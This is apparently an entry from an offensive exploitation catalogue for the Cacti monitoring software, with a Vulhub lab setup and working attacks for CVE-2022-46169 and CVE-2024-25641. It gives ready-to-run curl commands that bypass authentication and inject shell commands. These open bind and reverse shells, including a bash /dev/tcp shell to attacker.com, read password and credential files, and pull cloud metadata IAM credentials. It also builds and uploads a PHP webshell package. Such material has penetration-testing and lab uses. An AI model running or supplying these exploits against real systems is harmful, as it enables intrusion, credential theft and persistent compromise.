---
comment: |
  Cacti is an open-source network monitoring and graphing solution. CVE-2022-46169
  chains an authentication bypass with a command injection vulnerability in
  remote_agent.php. The endpoint validates the caller's IP against the Cacti
  database; the X-Forwarded-For header bypasses this check. The poller_id
  parameter is appended unsanitized to a shell command string passed to proc_open.
  Affects Cacti <= 1.2.22. Listed in the CISA KEV catalog.
docker:
  compose: "services:\n  cacti:\n    image: vulhub/cacti:1.2.22\n    ports:\n    \
    \  - \"8080:80\"\n    depends_on:\n      - db\n    environment:\n      DB_HOST:\
    \ db\n      DB_USER: cacti\n      DB_PASS: cacti\n      DB_NAME: cacti\n  db:\n\
    \    image: mysql:5.7\n    environment:\n      MYSQL_ROOT_PASSWORD: root\n   \
    \   MYSQL_DATABASE: cacti\n      MYSQL_USER: cacti\n      MYSQL_PASSWORD: cacti\n"
  note: "Uses the Vulhub lab image for CVE-2022-46169 (Cacti 1.2.22 + MySQL 5.7).\n\
    Access Cacti at `http://localhost:8080`. Default credentials: `admin` / `admin`.\n\
    After first login, add a device (e.g. localhost / 127.0.0.1) so that `host_id=1`\n\
    and `local_data_ids[0]=1` exist in the database \u2014 required for the injection\
    \ to fire.\nRun `docker compose up -d && sleep 30` to give the DB time to initialise\
    \ before browsing.\n"
functions:
  bind-shell:
  - code: |
      # CVE-2022-46169: bind shell via poller_id command injection
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;ncat -lvp 12345 -e /bin/sh &" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: |
      CVE-2022-46169: opens a bind shell on TCP 12345 via the poller_id injection.
      The trailing & detaches ncat from the HTTP request so the response completes.
      Connect with: nc victim.com 12345
      Requires ncat (nmap package) on the Cacti host.
    connector: tcp-client
    contexts:
      unauthenticated:
    platform: linux
    tty: false
    version: |
      <= 1.2.22
  file-read:
  - code: |
      # CVE-2022-46169: read files via poller_id command injection (same auth bypass as RCE)
      # Read /etc/passwd:
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;cat /etc/passwd" \
        -H "X-Forwarded-For: 127.0.0.1"

      # Read Cacti database credentials:
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;cat /etc/cacti/db.php" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: |
      CVE-2022-46169: reads arbitrary files via poller_id command injection.
      The same X-Forwarded-For IP spoofing bypass applies as for the RCE entry.
      Command output is returned inline in the HTTP response body.
      Key targets:
      - /etc/cacti/db.php or /var/www/html/cacti/include/config.php  (database credentials)
      - /etc/passwd, /etc/shadow (system users and hashes)
      - /var/www/html/cacti/include/config.php (Cacti admin DB password)
    contexts:
      unauthenticated:
    version: |
      <= 1.2.22
  file-write:
  - code: |
      # CVE-2024-25641: authenticated RCE via malicious Cacti package import
      # Step 1: create a malicious Cacti package XML containing a PHP webshell
      cat > /tmp/shell_package.xml << 'EOF'
      <?xml version="1.0" encoding="UTF-8"?>
      <cacti>
        <files>
          <file>
            <name>shell.php</name>
            <data><?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?></data>
            <filesignature>sha256</filesignature>
          </file>
        </files>
      </cacti>
      EOF
      gzip /tmp/shell_package.xml -c > /tmp/shell_package.xml.gz

      # Step 2: import the package as an authenticated admin:
      curl -s -X POST "http://victim.com/cacti/package_import.php" \
        -b "Cacti=<admin_session>" \
        -F "import_package=@/tmp/shell_package.xml.gz" \
        -F "__csrf_magic=<csrf_token>" \
        -F "action=save"
    comment: |
      CVE-2024-25641 (CVSS 9.1): Cacti < 1.2.27 allows authenticated administrators to
      import Cacti packages (XML archives) that contain arbitrary PHP files. The package
      import does not validate or sanitise the embedded file content. Imported files are
      written to the Cacti installation directory and served directly by the web server.
      The CSRF token is obtained from the package import page source.
      After import, access the webshell at:
        http://victim.com/cacti/shell.php?c=id
      Ref: https://github.com/cacti/cacti/security/advisories/GHSA-7cmj-g5qc-pj88
      nuclei: CVE-2024-25641
    contexts:
      admin:
    version: |
      < 1.2.27
  rce:
  - code: |
      # Enumerate valid host_id and local_data_ids values (increment if first attempt fails)
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;id" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: "\u26A0\uFE0F CISA KEV \u2014 confirmed exploited in the wild.\nCVE-2022-46169:\
      \ the poller_id GET parameter in remote_agent.php is concatenated\ninto a shell\
      \ command string without sanitization, then passed to proc_open.\nThe X-Forwarded-For\
      \ header spoofs the client IP as 127.0.0.1, satisfying the\nIP-based authentication\
      \ check that restricts access to trusted Cacti servers.\n\nhost_id and local_data_ids[0]\
      \ must reference an existing monitored host and its\nassociated data source\
      \ in the Cacti database. Default installs with at least one\nmonitored device\
      \ typically have host_id=1 and local_data_ids[0]=1. Increment\nboth values (1,\
      \ 2, 3...) if the initial attempt returns no output.\n\nCommand output is returned\
      \ inline in the HTTP response body.\nRef: https://www.exploit-db.com/exploits/51166\n"
    contexts:
      unauthenticated:
    version: |-
      <= 1.2.22
  reverse-shell:
  - blind: true
    code: |
      curl -s -G "http://victim.com/cacti/remote_agent.php" \
        --data-urlencode "action=polldata" \
        --data-urlencode "local_data_ids[0]=1" \
        --data-urlencode "host_id=1" \
        --data-urlencode "poller_id=;bash -c 'bash -i >& /dev/tcp/attacker.com/12345 0>&1' &" \
        -H "X-Forwarded-For: 127.0.0.1"
    comment: |
      CVE-2022-46169: spawns a reverse bash shell via the poller_id command injection.
      The trailing & detaches the shell from the process group so the HTTP request
      completes normally. The shell runs as the web server user (www-data, apache, or cacti).
    contexts:
      unauthenticated:
    listener: tcp-server
    platform: linux
    tty: false
    version: |-
      <= 1.2.22
  ssrf:
  - code: "# SSRF via Cacti data source SNMP polling \u2014 configure an internal\
      \ target as a monitored host\n# Step 1: add an internal host as a monitored\
      \ device (requires admin)\ncurl -s -X POST \"http://victim.com/cacti/host.php\"\
      \ \\\n  -b \"Cacti=<admin_session>\" \\\n  -d \"action=save&description=probe&hostname=169.254.169.254&snmp_community=public&snmp_version=1&__csrf_magic=<csrf_token>\"\
      \n\n# Step 2: Cacti's poller will probe the internal IP via SNMP/ICMP on the\
      \ next poll cycle.\n# Observe network traffic from the Cacti server to confirm\
      \ internal IP reachability.\n# For full-read SSRF via CVE-2022-46169 (unauthenticated),\
      \ use the RCE entry to\n# execute curl against internal endpoints:\ncurl -s\
      \ -G \"http://victim.com/cacti/remote_agent.php\" \\\n  --data-urlencode \"\
      action=polldata\" \\\n  --data-urlencode \"local_data_ids[0]=1\" \\\n  --data-urlencode\
      \ \"host_id=1\" \\\n  --data-urlencode \"poller_id=;curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/\"\
      \ \\\n  -H \"X-Forwarded-For: 127.0.0.1\"\n"
    comment: "Cacti's monitoring framework probes configured hosts server-side via\
      \ SNMP and ICMP.\nAdding an internal IP as a monitored device causes the Cacti\
      \ server to send probe\npackets to internal network segments, confirming host\
      \ reachability.\nFor full-read SSRF on unpatched CVE-2022-46169 instances, inject\
      \ curl into the\npoller_id parameter \u2014 command output including HTTP response\
      \ bodies is returned inline.\nCloud metadata endpoints:\n- AWS IMDSv1: http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\
      - GCP:        http://metadata.google.internal/computeMetadata/v1/\n- Azure:\
      \      http://169.254.169.254/metadata/instance?api-version=2021-02-01\n"
    contexts:
      admin:
      unauthenticated:
  webshell:
  - code: |
      # CVE-2024-25641: deploy a webshell via the Cacti package import feature
      # Package structure (shell_package.xml):
      # <?xml version="1.0" encoding="UTF-8"?>
      # <cacti>
      #   <files>
      #     <file>
      #       <name>shell.php</name>
      #       <data><?php if(isset($_REQUEST["c"])){system($_REQUEST["c"]);} ?></data>
      #     </file>
      #   </files>
      # </cacti>
      #
      # Compress and upload (see file-write entry for full curl command).
      # Access the deployed webshell at:
      curl "http://victim.com/cacti/shell.php?c=id"
    comment: |
      CVE-2024-25641: deploys a persistent PHP webshell via the Cacti package import.
      The webshell survives Cacti restarts and database changes until the file is deleted.
      Access at: http://victim.com/cacti/shell.php?c=id
      See the file-write entry for the full package creation and upload steps.
    contexts:
      admin:
    version: |
      < 1.2.27
...
